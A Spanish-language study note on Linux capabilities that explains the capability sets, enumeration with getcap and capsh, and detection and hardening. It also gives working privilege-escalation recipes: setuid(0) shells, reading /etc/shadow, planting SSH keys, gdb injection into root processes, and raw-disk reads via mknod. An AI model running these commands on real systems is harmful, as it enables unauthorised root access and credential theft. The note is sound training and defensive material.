---
aliases:
  - Capabilities Linux
  - File Capabilities
  - Linux Privileges
tags:
  - sec/priv-esc
  - sec/linux
tipo: concepto
estado: terminado
creado: 2026-10-11
actualizado: 2026-10-11
relacionado:
  - "[[Privilegios SUID en Linux]]"
  - "[[Abuso de Permisos en Linux y LSE]]"
  - "[[Secuestro de Bibliotecas Compartidas]]"
  - "[[Abuso de Docker para Escalada de Privilegios y Escape de Contenedores]]"
  - "[[Lectura de Permisos]]"
  - "[[Grupos de Linux y Escalada de Privilegios]]"
fuente: "https://man7.org/linux/man-pages/man7/capabilities.7.html"
---

# Linux Capabilities

Las **capabilities** son la descomposición del privilegio monolítico de `root` en ~41 unidades independientes (`CAP_SETUID`, `CAP_NET_RAW`, `CAP_SYS_ADMIN`…) que el kernel puede otorgar a **procesos** y a **archivos** por separado. En lugar de un modelo binario (root / no-root), permiten el Principio de Mínimo Privilegio: un daemon que solo necesita abrir un socket crudo recibe `CAP_NET_RAW` y nada más — si lo comprometen, no heredan `root`.

> [!info] Por qué existió la división
> Históricamente, todo lo que requería privilegio chequeaba `euid == 0`. Eso obligaba a correr `ping`, `ntpd`, `mail` o el *window server* como root completo. Desde Linux 2.2 (capabilities en kernel) y 2.6.25 (file capabilities en xattr) el chequeo pasó a ser `capable(CAP_XXX)`: cada operación sensible pide **su** capability. Un binario con `cap_net_raw` puede crear sockets crudos **sin** poder escribir en `/etc/shadow` — la superficie de ataque de un compromiso baja dramáticamente.

> [!warning] Corrección de una descripción clásica
> Las capabilities **no son "tres permisos (efectivos, heredados, permitidos) donde los permitidos incluyen a los otros dos"**. Son **conjuntos separados** con reglas de transición exactas: *permitted* es el depósito, *effective* es el bit que decide si se usa *ahora*, *inheritable* es el filtro para el próximo `execve`, y existe un cuarto conjunto — *ambient* — más el *bounding* (techo). Ver la mecánica abajo; sin ese modelo no se entiende por qué un ataque funciona o no.

## Mecánica: los conjuntos y qué pasa en cada `execve`

Todo proceso (y todo archivo con file capabilities) tiene **cinco** conjuntos:

| Conjunto | Símbolo | Qué es | Dónde vive |
|---|---|---|---|
| **Permitted** | `p` | el *depósito*: qué caps **puede** tener el proceso. Si una cap no está aquí, no existe para él | proceso / archivo |
| **Effective** | `e` | si está en `1`, las caps de *permitted* se aplican **en este momento** a las llamadas al sistema | proceso / archivo |
| **Inheritable** | `i` | filtro de *lo que quiero pasar* a un binario no privilegiado en el próximo `execve` | proceso / archivo |
| **Ambient** | `a` | caps que **sobreviven al `execve`** de binarios sin SUID ni file caps (herencia real, ver más abajo) | proceso |
| **Bounding** | `b` | **techo** del root: qué caps pueden siquiera ser adquiridas vía file caps / herencia | proceso |

Transición en `execve` (simplificado de `capabilities(7)`):

```text
P'(permitted) = (P(inheritable) & F(inheritable)) | (F(permitted) & P(bounding))
P'(effective) = F(effective) ? P'(permitted) : P(effective)      # F = atributo del archivo
P'(ambient)   = P(ambient)   solo si P'(permitted) ⊇ P(ambient) y el archivo no es privilegiado
```

Lectura de ataque de esas fórmulas:

- **`P(bounding)` corta por arriba**: si root bajó `CAP_SETUID` del bounding, un archivo con `cap_setuid+ep` **no recibe** la cap — el `& P(bounding)` se la quita. Útil como hardening y como falso positivo.
- **Los binarios privilegiados (SUID/SGID o con file caps) ignoran inheritable/ambient "automáticos"**: el kernel los reinicializa desde el archivo. Por eso `LD_*`, `PYTHONPATH` o ambient *no* se cuelan en procesos privilegiados (ver [[Secuestro de Bibliotecas Compartidas]]).
- **`F(effective)=0`** significa que la cap está *en permitted* pero **no activa**: `getcap` la mostraría con `p` pero sin `e` y `capable()` la negaría.

### Permisos de archivo vs SUID

| Mecanismo | Dónde se guarda | Otorga | Granularidad |
|---|---|---|---|
| **SUID/SGID** | bit en el inode (`chmod u+s`) | **todos** los privilegios del dueño (euid=0 = root entero) | 0 — todo o nada |
| **File capabilities** | xattr `security.capability` | **solo** las caps listadas | alta |
| **Capabilities de proceso** | memoria del proceso (`/proc/pid/status`) | lo que el proceso heredó/levantó | por proceso |

> [!tip] `ep` no es "elevated execution bit"
> En la salida de `getcap`, `cap_net_raw+ep` es **notación de flags**: `e` = *effective*, `p` = *permitted* (`i` = inheritable). El `+` añade, el `=` fija la lista exacta, el `-` quita. `cap_setuid+ep` = "tiene `cap_setuid` en permitted **y** activa". Llamarlo "bit de ejecución elevado" lleva a leer mal salidas como `=ep` vs `+ei`.

## Enumeración: flujo de trabajo completo

```bash
# 1) Buscar TODOS los archivos con file capabilities (el comando clave)
getcap -r / 2>/dev/null
# salida típica:  /usr/bin/ping = cap_net_raw+ep
#                 /usr/bin/python3.8 = cap_setuid+ep          ← flag P1

# 2) Leer las capabilities del proceso actual / de otro proceso
grep Cap /proc/self/status
#   CapInh: 0000000000000000   CapPrm: 0000000000000000
#   CapEff: 0000000000000000   CapBnd: 000001ffffffffff   CapAmb: 0000000000000000
cat /proc/<pid>/status | grep Cap        # daemons sospechosos

# 3) Decodificar hex → nombres
capsh --decode=00000000a80425fb
#   0x00000000a80425fb = cap_chown,cap_dac_override,...,cap_setuid+ep
capsh --print                            # sets del shell + bounding + current
getpcaps $$                              # caps efectivas del PID

# 4) Cruzar con SUID (suelen ir de la mano en los labs)
find / -perm -4000 -type f 2>/dev/null   # ver [[Privilegios SUID en Linux]]
```

### Triage: qué es urgente

| Salida de `getcap -r /` | Nivel | Por qué |
|---|---|---|
| `cap_setuid+ep` / `cap_setgid+ep` / `cap_setuid,cap_setgid+ep` en intérpretes o utilidades con código arbitrario | **P1 — root directo** | `setresuid(0,0,0)` desde el proceso |
| `cap_dac_override` / `cap_dac_read_search` | **P1** | leer `shadow`, `id_rsa`, escribir cualquier archivo |
| `cap_sys_admin` | **P1** | `mount`, escape de contenedor (ver Docker note) |
| `cap_sys_module` / `cap_sys_rawio` / `cap_sys_ptrace` / `cap_setfcap` | **P1** | `insmod`, `/dev/mem`, inyectar en PID root, crear file caps arbitrarias |
| `cap_mknod` / `cap_fowner` | **P2** | disco crudo (`shadow`), `chmod` sobre cualquier archivo |
| `cap_bpf`+`cap_perfmon` / `cap_syslog` | **P2** | eBPF → R/W kernel; leak de KASLR |
| `cap_net_raw` / `cap_net_admin` | **P3** | sniff/MITM — lateral, no root directo |
| `cap_net_bind_service` solo | **informativo** | normal en `ping`, `dumpcap`; sin escalada |

> [!warning] `ping` moderno
> Ejemplos antiguos (y muchas notas de internet) imprimen `/usr/bin/ping = cap_net_admin,cap_net_raw+ep`. En distros actuales `ping` solo lleva **`cap_net_raw+ep`** (o usa `iputils` con `cap_net_raw`). `cap_net_admin` aparece típicamente en `dumpcap`/Wireshark **cuando se configuró** para captura completa — no asumir la salida vieja al comparar con un sistema real.

## Catálogo: capabilities peligrosas y su explotación

> [!info] Supuesto de las recetas
> File capabilities se aplican **al binario que se ejecuta**. La receta funciona cuando el binario con la cap permite ejecución/interpretación de código tuyo (`python3`, `perl`, `find`… con `-exec`, un binario que lanza shell) o cuando es una utilidad con efecto suficiente (`cat`, `chmod`, `mount`). Un binario funcional cerrado (p. ej. `ping`) con una cap peligrosa **solo** da lo que su funcionalidad expone — es *confused deputy*, no shell.

| Cap (nº) | Qué permite | Explotación típica (binario `BLOQUE` con la cap) |
|---|---|---|
| `cap_setuid` (7) | `set*uid()` a **cualquiera**, incl. 0 | `BLOQUE -c 'import os; os.setuid(0); os.system("/bin/sh")'` → **root** |
| `cap_setgid` (6) | `set*gid()` a cualquiera | con setuid → root completo; solo → grupos root |
| `cap_setfcap` (31) | escribir xattr `security.capability` en cualquier archivo propio | `setcap cap_setuid,cap_dac_override+ep ./pwn && ./pwn` → **root** |
| `cap_dac_override` (1) | salta DAC: leer/escribir **cualquier** archivo | `BLOQUE -c 'open("/etc/shadow","a").write(hash)'` o `cat /etc/shadow` |
| `cap_dac_read_search` (2) | leer cualquier archivo y traversar dirs | `cat /root/.ssh/id_rsa /etc/shadow` |
| `cap_fowner` (3) | operaciones de *dueño* sobre **cualquier** archivo | `BLOQUE /etc/shadow` → `chmod 666 /etc/shadow` → editarlo |
| `cap_chown` (0) | `chown` arbitrario | `chown user:user /etc/shadow` → escribirlo como dueño |
| `cap_sys_admin` (21) | mount/umount, pivot_root, namespaces, swapon, hosts… | `mount -t tmpfs t /mnt` + bind sobre `/etc`, o escape de contenedor (ver [[Abuso de Docker para Escalada de Privilegios y Escape de Contenedores]]) |
| `cap_sys_ptrace` (19) | `ptrace` a **cualquier** proceso | `gdb -p 1` → inyectar `system("chmod u+s /bin/bash")` en un proceso root |
| `cap_sys_module` (16) | `finit_module`/`init_module` | `insmod rootkit.ko` → código **en kernel** = root |
| `cap_sys_rawio` (17) | `/dev/mem`, `/dev/kmem`, `ioperm`/`iopl` | `dd if=/dev/mem` → volcar/reescribir estructuras `cred` (hoy limitado por `CONFIG_STRICT_DEVMEM`) |
| `cap_sys_chroot` (18) | `chroot` arbitrario | chroot a un árbol **propio** con `/bin/sh` → root ejecuta *tu* binario en arranque |
| `cap_sys_boot` (22) | `reboot`, `kexec` | DoS total; cargar kernel alternativo |
| `cap_sys_tty_config` (26) | `TIOCSTI`/`TIOCLINUX` sobre terminales | inyectar keystrokes en una sesión root en el mismo tty → root |
| `cap_mknod` (27) | `mknod` de dispositivos | `mknod /tmp/sda b 8 0` → leer disco crudo → `shadow` (equivalente al grupo `disk`, ver [[Grupos de Linux y Escalada de Privilegios]]) |
| `cap_net_admin` (12) | interfaces, rutas, iptables, qdisc | MITM: `iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080` |
| `cap_net_raw` (13) | sockets crudos, ARP, sniff | `python3 -c 'import socket; s=socket.socket(AF_PACKET,SOCK_RAW)'` → sniff/ARP spoof |
| `cap_net_bind_service` (10) | escuchar <1024 | solo relevante para service hijacking (ver [[Explotación de Servicios Internos]]) |
| `cap_bpf` (39) + `cap_perfmon` (38) | eBPF + perf | cargar programas BPF → historia de bugs de verificador = R/W kernel; con perfmon se lee memoria kernel |
| `cap_syslog` (34) | `dmesg` restringido, `/proc/kmsg` | fuga de direcciones kernel → elude KASLR |
| `cap_audit_control` (30) / `cap_audit_write` (29) | reglas de auditd | borrar/evitar evidencia — evasión de detección |
| `cap_sys_resource` (24) | `setrlimit` sin límite | core dumps completos (fugas), ampliar cuotas |
| `cap_sys_time` (25) | reloj del sistema | romper Kerberos/NTLM con tickets time-based |

### Receta raíz estándar: `cap_setuid` en un intérprete

```bash
getcap -r / 2>/dev/null | grep setuid
#   /usr/bin/python3.8 = cap_setuid+ep

# setuid(0) con CAP_SETUID activa pone ruid=euid=suid=0 → shell root
python3 -c 'import os; os.setuid(0); os.execl("/bin/sh","sh")'
# equivalente con Perl / Ruby si son los que llevan la cap:
perl -e 'POSIX::setuid(0); exec "/bin/sh"'
# o vía setpriv/capsh si están disponibles:
capsh --caps="cap_setuid+eip" --uid=0 -- -p
```

### Receta lectura/escritura: `cap_dac_*`

```bash
# Si el binario con la cap es cualquiera que ejecute/interprete código:
python3 -c 'print(open("/etc/shadow").read())'          # dac_read_search o dac_override
# Escritura directa (dac_override) — p. ej. plantar clave SSH:
python3 -c 'open("/root/.ssh/authorized_keys","a").write("ssh-ed25519 AAAA…\n")'
# Si el portador es `tar`/`cat`/`cp` con la cap: el comando ya ES el exploit
cat /etc/shadow ; cp /root/.ssh/id_rsa /tmp/
```

### Receta `cap_sys_admin` (mount → root / escape)

```bash
# Overwrite de /etc vía tmpfs bind (clásico en labs):
mkdir /tmp/x && mount -t tmpfs none /tmp/x
# escape de contenedor: mount de un FS host o pivot_root si no hay seccomp
# (detalle completo en la nota de Docker)
```

### Receta `cap_sys_ptrace` (inyección en proceso root)

```bash
gdb -p $(pgrep -u root -f 'cron|systemd' | head -1)
#  (gdb) call (int)system("cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash")
```

### Receta `cap_mknod` (disco crudo → shadow)

```bash
lsblk                                   # ver major:minor del FS raíz (8:0 = sda)
mknod /tmp/sda b 8 0
debugfs -R "cat /etc/shadow" /tmp/sda 2>/dev/null
```

## Ambient capabilities (el tercer camino, ni SUID ni file caps)

**Problema**: `inheritable` no sobrevive sola a `execve` de binarios normales (necesita que el archivo también declare la cap). **Solución** (kernel ≥ 4.3): el conjunto **ambient**, que el kernel **mantiene** en el `execve` de binarios *no privilegiados* si sigue estando en permitted.

```bash
# Requisitos: la cap estar en inheritable Y permitted, y levantarla como ambient:
capsh --addamb=cap_net_bind_service -- -p
prctl(PR_CAP_AMBIENT_RAISE, CAP_NET_BIND_SERVICE)   # syscall subyacente
# Comprobar:
grep CapAmb /proc/self/status

# systemd (el uso real): daemon no-root con una sola cap
[Service]
User=app
AmbientCapabilities=CAP_NET_BIND_SERVICE
CapabilityBoundingSet=CAP_NET_BIND_SERVICE
NoNewPrivileges=true
```

Casos de abuso:

- Un servicio que hace `exec` de un helper con ambient **pasa sus caps al helper** — si el helper se busca en un `PATH` escribible, ver [[PATH Hijacking]]: ejecutas *tu* binario y **recibes sus capabilities**.
- `NoNewPrivileges=true` (o `setpriv --no-new-privs`, seccomp en contenedores) **bloquea** el otorgamiento de caps vía exec: cualquier binario SUID/file-caps pierde efecto. Es la mitigación más limpia para servicios que no necesitan elevarse.

> [!tip] Bounding vs ambient — la pareja a auditar
> `CapabilityBoundingSet` dice **qué puede llegar a tener** el proceso (techo); `AmbientCapabilities` dice **qué recibe**. Un daemon con bounding amplio y ambient vacío es menos peligroso que al revés. En enumeración ofensiva, `grep -E 'Cap(Amb|Bnd)' /proc/*/status` con valores inesperados delata configuraciones raras.

## Detección (lado defensor)

| Señal | Cómo mirarla |
|---|---|
| Archivo nuevo/modificado con file caps | diff diario de `getcap -r /`; FIM con soporte de xattr (AIDE `xattrs`), `getfattr -d -m security.capability -R /usr/bin` |
| `setcap` ejecutado | `auditctl -a always,exit -F arch=b64 -S execve -F exe=/sbin/setcap -k setcap_use` |
| Proceso con caps inesperadas | osquery: `processes` + `capabilities`; alertar si `CapEff != 0` en servicios que no deberían |
| Ambient raise | audit sobre `prctl` con `PR_CAP_AMBIENT_RAISE` |
| `cap_setuid`/`cap_sys_admin` en binarios de usuario | alerta de inventario: esas caps **no** existen en una instalación base |
| Evasión de auditd | proceso con `cap_audit_control` cambiando reglas (`ausearch` discontinuo) |

Artefactos ofensivos clave: `getcap -r /` (huella de bash/history), `capsh`, `getpcaps`, binarios recién `setcap`eados en `/usr/local/bin`, xattrs nuevas.

## Impacto

- **Root completo**: `cap_setuid`, `cap_setfcap`, `cap_sys_ptrace`+capacidad de modificar un binario root, `cap_sys_module`, `cap_dac_override`+escritura (editar `/etc/passwd`), `cap_chown`+`cap_dac` combinadas.
- **Root indirecto**: `cap_sys_admin` (mount/escape), `cap_mknod`/`cap_sys_rawio` (disco/memoria), `cap_dac_read_search` (credenciales que luego se usan con `su`).
- **Lateral/MITM**: `cap_net_admin`, `cap_net_raw`, `cap_net_bind_service`.
- **Evasión**: `cap_audit_control`, `cap_syslog`.

## Sección defensiva: endurecimiento

```bash
# 1) Inventario y limpieza: quitar caps que nadie justificó
setcap -r /usr/bin /usr/sbin /usr/local/bin 2>/dev/null     # (-r = remove todas)
getcap -r / | tee /root/audit/caps-baseline.txt             # y diff diario

# 2) Bounding mínimo por servicio (systemd)
[Service]
CapabilityBoundingSet=CAP_NET_BIND_SERVICE   # techo duro: nada más puede llegar
AmbientCapabilities=CAP_NET_BIND_SERVICE     # exactamente lo que necesita
NoNewPrivileges=true                         # bloquea SUID/file-caps heredados

# 3) Para el usuario: sin elevar nunca
prctl(PR_SET_NO_NEW_PRIVS) / setpriv --no-new-privs
#  en systemd user: NoNewPrivileges=yes en el unit global

# 4) Techo global del sistema (runtime): recortar lo que root ya no usará
capsh --drop=cap_net_admin,cap_sys_module -- -c 'systemctl restart X'   # con cuidado
#  bounding de login: /etc/security/capability.conf (pam_cap)

# 5) FS: caps solo donde el FS soporta xattr y está controlado
#    /tmp y /home montados con `nosuid` (mata SUID Y file caps):
mount -o remount,nosuid /tmp /home

# 6) Selinux/AppArmor encima: aunque tengan la cap, la política puede negar la acción
#    (ver sección MAC más abajo)
```

> [!info] MAC como techo adicional
> SELinux/AppArmor operan en un nivel **anterior** al chequeo de capability: un proceso con `cap_sys_admin` en una política confinada seguirá recibiendo `EACCES` si su dominio no permite `mount`. En hardened distros (Fedora, Ubuntu con profiles) una capability suelta **no basta** — combinar siempre: bounding + `NoNewPrivileges` + MAC.

> [!warning] `setcap` mal usado es SUID con pasos extra
> `setcap cap_setuid,cap_dac_override+ep /usr/local/bin/herramienta` convierte cualquier bug de *herramienta* en root. Regla: **la cap mínima, en el binario mínimo, con bounding mínimo**. Y recordar que modificar el binario o copiarlo sin `--preserve=xattr` **borra** las file capabilities (el `cp` pierde la xattr → `getcap` vacío, un falso "ya no está").

## Errores comunes

1. **Leer `+ep` como "elevated execution bit"** — son los flags `e`(ffective) y `p`(ermitted); `+ei` sería inheritable sin efectividad.
2. **Creer que "permitted incluye a effective e inheritable"** — son conjuntos independientes; *effective* puede estar en `0` estando *permitted* en `1` (la cap existe pero no actúa).
3. **Confundir file caps con privilegio del usuario** — `getcap` mira **archivos**; tu shell casi siempre tiene `CapEff: 0000000000000000` (o las de un root completo).
4. **Esperar escalada de `cap_net_raw` en `ping`** — `ping` no ejecuta tu código: solo hace echo requests. La cap importa cuando el portador ejecuta/intepreta código o tiene efecto de archivo.
5. **Olvidar el bounding set** — `cap_setuid+ep` en un archivo **no se concede** si `CAP_SETUID` no está en `CapBnd` (falso positivo de automatizadores).
6. **`cp` sin preservar xattr** — "el binario perdió sus capabilities" es artefacto de la copia, no mitigación.
7. **`setcap` en FS sin xattr** (`FAT`, ciertos `tmpfs`) → `setcap: failed to set capabilities` — habilitar `user_xattr` o usar el FS correcto.
8. **Asumir que quitar SUID es quitar capabilities** — mecanismos distintos: auditar **ambos** (`find -perm -4000` **y** `getcap -r`).
9. **`cap_setgid` sola no da root** — da GID 0 (grupo `root`), útil solo con permisos de grupo; la combinación setuid+setgid sí es root total.

## Cheatsheet

```bash
# Enumeración
getcap -r / 2>/dev/null
grep Cap /proc/self/status          # CapInh/CapPrm/CapEff/CapBnd/CapAmb
capsh --decode=00000000a80425fb     # hex → nombres
capsh --print ; getpcaps $$
find / -perm -4000 -type f 2>/dev/null     # complemento SUID

# Otorgar / quitar (root)
setcap cap_net_raw+ep /usr/bin/tool
setcap -r /usr/bin/tool                       # quitar todas
getfattr -d -m security.capability /usr/bin/tool

# Explotación (si el binario con cap ejecuta tu código)
python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'   # cap_setuid
python3 -c 'print(open("/etc/shadow").read())'               # cap_dac_read_search
mknod /tmp/sda b 8 0 && debugfs -R "cat /etc/shadow" /tmp/sda # cap_mknod
gdb -p <root-pid>                                            # cap_sys_ptrace
setcap cap_setuid+ep ./pwn                                    # cap_setfcap → root

# Ambient
capsh --addamb=cap_net_bind_service -- -p
# systemd: AmbientCapabilities= / CapabilityBoundingSet= / NoNewPrivileges=true

# Hardening
setcap -r / ; mount -o remount,nosuid /tmp
auditctl -a always,exit -F arch=b64 -S execve -F exe=/sbin/setcap -k setcap_use
```

## Referencias

- `capabilities(7)` — modelo, fórmulas de transición y lista completa: https://man7.org/linux/man-pages/man7/capabilities.7.html
- `getcap`/`setcap` (libcap): https://man7.org/linux/man-pages/man8/setcap.8.html
- HackTricks — Linux privilege escalation (capabilities): https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation.html
- PayloadsAllTheThings — Linux privilege escalation: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation
- systemd.exec — `AmbientCapabilities`/`CapabilityBoundingSet`: https://www.freedesktop.org/software/systemd/man/latest/systemd.exec.html
- Notas internas: [[Privilegios SUID en Linux]], [[Abuso de Permisos en Linux y LSE]], [[Secuestro de Bibliotecas Compartidas]], [[Abuso de Docker para Escalada de Privilegios y Escape de Contenedores]]

## Relacionadas

- [[Privilegios SUID en Linux]] — el mecanismo "todo o nada" que capabilities reemplaza
- [[Abuso de Permisos en Linux y LSE]] — dónde encaja `getcap -r` en el flujo de enumeración
- [[Secuestro de Bibliotecas Compartidas]] — por qué los binarios privilegiados ignoran `LD_*` (secure-execution)
- [[PATH Hijacking]] — ambient caps + helper buscado en `PATH` = caps heredadas por tu binario
- [[Abuso de Docker para Escalada de Privilegios y Escape de Contenedores]] — `CAP_SYS_ADMIN` como vector de escape
- [[Grupos de Linux y Escalada de Privilegios]] — `cap_mknod` ≈ grupo `disk`
- [[Lectura de Permisos]] — xattrs y permisos de archivo en contexto
